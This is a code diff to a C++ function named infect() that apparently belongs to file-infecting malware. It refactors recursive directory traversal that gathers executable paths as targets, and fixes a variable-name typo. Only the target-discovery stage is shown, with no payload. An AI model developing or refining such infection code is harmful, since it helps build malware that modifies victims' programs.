@@ -202,16 +202,15 @@ int infect(void)
 
       do
       {
-         if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
-             (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
-         {
-            char slash[] = {'\\',0};
-            char dot[] = {'.', 0};
-            char dotDot[] = {'.', '.', 0};
+         char slash[] = {'\\',0};
+         char dot[] = {'.', 0};
+         char dotDot[] = {'.', '.', 0};
 
-            if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
-               continue;
-            
+         if (strnicmp(find_data.cFileName, dot, 2) == 0 || strnicmp(find_data.cFileName, dotDot, 3) == 0)
+            continue;
+         else if ((find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0x10 &&
+                  (find_data.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) != 0x400)
+         {
             char *new_directory = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(slash)+strlen(find_data.cFileName)+1));
             memcpy(new_directory, search_visit, strlen(search_visit)+1);
             strncat(new_directory, slash, strlen(slash));
@@ -251,7 +250,7 @@ int infect(void)
 
    std::wcout << found_executables_size << " executables were found." << std::endl;
 
-   for (std::size_t i=0; i<found_excutables_size; ++i)
+   for (std::size_t i=0; i<found_executables_size; ++i)
    {
       std::wcout << "\t" << found_executables[i] << std::endl;
       free(found_executables[i]);
